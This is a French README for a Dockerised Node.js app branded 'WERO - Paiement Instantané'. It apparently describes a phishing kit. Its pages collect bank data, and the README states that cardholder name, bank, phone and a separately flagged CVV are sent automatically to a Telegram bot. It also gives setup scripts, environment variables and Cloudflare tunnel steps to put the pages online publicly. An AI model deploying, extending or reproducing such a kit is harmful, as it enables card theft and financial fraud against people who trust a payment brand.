# WERO - Paiement Instantané

Application de paiement instantané avec Node.js, Express et Docker.

## 🚀 Démarrage rapide

### Option 1: Local (Docker)
```bash
cd wero-project
docker compose up -d
# Accédez à http://localhost:8002
```

### Option 2: Cloudflare Tunnel (Public)
```bash
# Linux/Mac
chmod +x setup-cloudflare.sh
./setup-cloudflare.sh

# Windows
.\setup-cloudflare.ps1
```

## 📋 Services

- **Node.js Backend** : Port 8002 (externe) → 3000 (interne)
- **MySQL Database** : Port 3306
- **Cloudflare Tunnel** : Optional (pour accès public)

## 🔧 Configuration

### Variables d'Environnement

**Fichier `.env` (Local)**
```env
NODE_ENV=development
PORT=3000
DB_HOST=mysql
TELEGRAM_BOT_TOKEN=[ta-clé-telegram]
TELEGRAM_CHAT_ID=[ton-id-chat]
```

**Fichier `.env.production` (Production avec Tunnel)**
```env
NODE_ENV=production
PORT=3000
DB_HOST=mysql
TELEGRAM_BOT_TOKEN=[ta-clé-telegram]
TELEGRAM_CHAT_ID=[ton-id-chat]
CLOUDFLARE_TOKEN=[ton-token-tunnel]
```

## 📁 Structure

```
wero-project/
├── backend-nodejs/
│   ├── views/              # Pages EJS
│   ├── server.js           # Application principale
│   ├── telegramService.js  # Service Telegram
│   ├── Dockerfile          # Config Docker + cloudflared
│   ├── docker-entrypoint.sh # Script de démarrage
│   ├── package.json        # Dépendances
│   ├── .env                # Variables locales
│   └── .env.example        # Template
├── docker-compose.yml      # Orchestration services
├── .env.cloudflare         # Template Cloudflare
├── DEPLOYMENT.md           # Guide détaillé Cloudflare
├── setup-cloudflare.sh     # Setup automatique (Linux/Mac)
├── setup-cloudflare.ps1    # Setup automatique (Windows)
└── README.md               # Ce fichier
```

## 🌐 Pages Disponibles

| Page | URL | Description |
|------|-----|-------------|
| Accueil | `/` | Page d'accueil WERO |
| Accords | `/accords` | Acceptation des conditions |
| Vérification | `/premiere` | Formulaire de données bancaires |
| Confirmation | `/deuxieme` | Confirmation finale |

## 📱 Intégration Telegram

L'app envoie automatiquement à Telegram :
- ✅ **Accord accepté** - Quand l'utilisateur accepte les conditions
- ✅ **Données du formulaire** - Titulaire, banque, téléphone
- ✅ **CVV (séparé)** - Alerte spéciale pour le CVV

Tout est **chiffré** et **sécurisé** 🔐

## 🔗 Déploiement Cloudflare Tunnel

### Qu'est-ce que Cloudflare Tunnel?

Un tunnel sécurisé qui rend ton app **publique** sans ouvrir les ports :
- ✅ HTTPS automatique
- ✅ Protection DDoS
- ✅ Pas de configuration réseau
- ✅ Accessible partout

### Étapes d'Installation

1. **Créer un tunnel Cloudflare**
   ```bash
   # Va sur: https://dash.cloudflare.com/tunnels
   # Crée "wero" et copie le token
   ```

2. **Lancer le setup automatique**
   ```bash
   # Linux/Mac
   ./setup-cloudflare.sh
   
   # Windows
   .\setup-cloudflare.ps1
   ```

3. **Accéder publiquement**
   ```
   https://wero-[uuid].trycloudflare.com
   ```

Voir **[DEPLOYMENT.md](./DEPLOYMENT.md)** pour les détails complets.

## 🛠️ Commandes Utiles

```bash
# Démarrer les services
docker compose up -d

# Voir les logs
docker compose logs nodejs -f

# Redémarrer l'app
docker compose restart nodejs

# Arrêter les services
docker compose down

# Arrêter et supprimer les données
docker compose down -v
```

## 🔒 Sécurité

| Feature | Status |
|---------|--------|
| HTTPS (Cloudflare) | ✅ Automatique |
| Chiffrement données | ✅ TLS 1.3 |
| DDoS Protection | ✅ Inclus |
| Ports fermés | ✅ Aucun ouvert |
| CVV masqué | ✅ Telegram |
| Rate limiting | ⚠️ À implémenter |

## 🧪 Tester

```bash
# Test local
curl http://localhost:8002

# Test Telegram
curl -X POST http://localhost:8002/api/test-telegram

# Health check
curl http://localhost:8002/api/health
```

## 📊 Architecture

```
┌─────────────────────────────────────────────────────┐
│              Utilisateur Final                      │
└──────────────────────┬──────────────────────────────┘
                       │
          ┌────────────▼─────────────┐
          │  Cloudflare Tunnel       │
          │  (HTTPS + DDoS)          │
          └────────────┬─────────────┘
                       │
          ┌────────────▼─────────────┐
          │  Docker Container        │
          │  ┌──────────────────┐    │
          │  │  Node.js App     │    │
          │  │  (Express)       │    │
          │  └──────────────────┘    │
          │  ┌──────────────────┐    │
          │  │  MySQL Database  │    │
          │  └──────────────────┘    │
          └──────────────────────────┘
                       │
          ┌────────────▼─────────────┐
          │  Telegram Bot API        │
          │  (Notifications)         │
          └──────────────────────────┘
```

## 🚨 Troubleshooting

### App ne démarre pas
```bash
# Vérifier les erreurs
docker compose logs nodejs

# Reconstruire l'image
docker compose build --no-cache nodejs
```

### Tunnel ne se connecte pas
```bash
# Vérifier le token Cloudflare
docker compose logs nodejs | grep "cloudflared"

# Redémarrer
docker compose restart nodejs
```

### Telegram ne fonctionne pas
```bash
# Test Telegram
curl -X POST http://localhost:8002/api/test-telegram

# Vérifier .env
cat .env | grep TELEGRAM
```

## 📞 Support

- **Documentation** : Voir [DEPLOYMENT.md](./DEPLOYMENT.md)
- **Logs** : `docker compose logs nodejs -f`
- **Issues** : Vérifier les erreurs dans les logs

## 📄 Licence

ISC

---

**Déployé avec ❤️ sur Node.js + Docker + Cloudflare**
